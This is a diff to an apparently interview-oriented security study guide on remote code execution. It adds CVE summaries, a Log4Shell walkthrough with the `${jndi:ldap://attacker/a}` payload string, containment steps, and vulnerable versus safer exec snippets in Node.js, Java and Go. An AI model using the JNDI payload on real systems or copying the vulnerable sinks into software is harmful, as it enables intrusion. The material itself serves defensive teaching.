@@ -75,11 +75,77 @@ Untrusted data triggers a **lookup** to an attacker server → **loads** attacke
 | Example | Primitive |
 |---------|-----------|
 | **Log4Shell (Log4j CVE-2021-44228)** | JNDI lookup from log message → remote class load |
-| **Spring4Shell** area (Spring Framework RCE classes, **verify** CVE IDs for interview) | Auto-binding / classloader abuse (study **current** advisories) |
-| **ImageTragick** | Image decoder → `delegate` command execution |
+| **Spring4Shell (CVE-2022-22965)** | Spring MVC data binding / classloader access on JDK 9+ |
+| **ImageTragick (CVE-2016-3714)** | ImageMagick delegate → shell command execution |
+| **Shellshock (CVE-2014-6271)** | Bash env var function injection |
+| **ProxyShell / ProxyLogon** | Exchange chain → RCE (enterprise IR stories) |
+| **Citrix Bleed (CVE-2023-4966)** | Buffer overread → session token leak → follow-on access |
 | **Deserialization chains** | **ysoserial**, **marshalsec** (Java); **pickle** abuse (Python) |
 
 Use **vendor advisories** and **NVD** for exact CVE metadata when preparing employer-specific loops.
+
+---
+
+## L2 — CVE walkthrough: Log4Shell (architecture-level)
+
+**Flow:** Attacker sends `${jndi:ldap://attacker/a}` in a field that gets **logged** → Log4j **lookup** resolves JNDI → attacker-controlled **LDAP** returns **Reference** with **factory** → JVM loads **remote class** → **RCE**.
+
+**Containment (first 24h):** WAF rules (temporary), **disable lookups** (`log4j2.formatMsgNoLookups`), **patch** to fixed versions, **hunt** outbound LDAP/RMI/DNS from app subnets, **rotate** secrets on affected hosts.
+
+**Interview lesson:** **Never evaluate** untrusted strings as **active resolution** paths (JNDI, EL, templates, scripts).
+
+---
+
+## L2 — CVE walkthrough: Spring4Shell (pattern)
+
+**Pattern:** Attacker manipulates **request parameters** bound to **Java objects** to reach **ClassLoader** / **access rules** on vulnerable Spring + JDK combinations.
+
+**Fix:** Patch Spring; **WAF** secondary; **reduce** exposed actuator endpoints; **principle of least privilege** on app process.
+
+---
+
+## L2 — Additional language sinks
+
+### Node.js
+
+```javascript
+// Vulnerable — never pass user input to eval or child_process with shell
+const user = req.query.cmd;
+require('child_process').exec(`convert ${user}`, ...);  // command injection
+
+// Safer
+const { execFile } = require('child_process');
+execFile('/usr/bin/convert', ['input.png', 'out.png'], ...);
+```
+
+### Java
+
+```java
+// Vulnerable patterns (search in reviews)
+Runtime.getRuntime().exec("sh -c " + userInput);
+new ObjectInputStream(untrustedStream).readObject();
+```
+
+### Go
+
+```go
+// Vulnerable — shell invocation with user string
+exec.Command("sh", "-c", "ping "+host).Run()
+// Safer
+exec.Command("ping", "-c", "1", host).Run()
+```
+
+---
+
+## L2 — Tooling interviewers expect
+
+| Tool | Use |
+|------|-----|
+| **Semgrep / CodeQL** | Find exec, eval, deserialization sinks |
+| **Burp Scanner** | Confirm web RCE chains |
+| **ysoserial** (lab) | Demonstrate Java gadget *existence* |
+| **nuclei** | Known CVE templates |
+| **Falco / EDR** | Detect shell from app user |
 
 ---
 
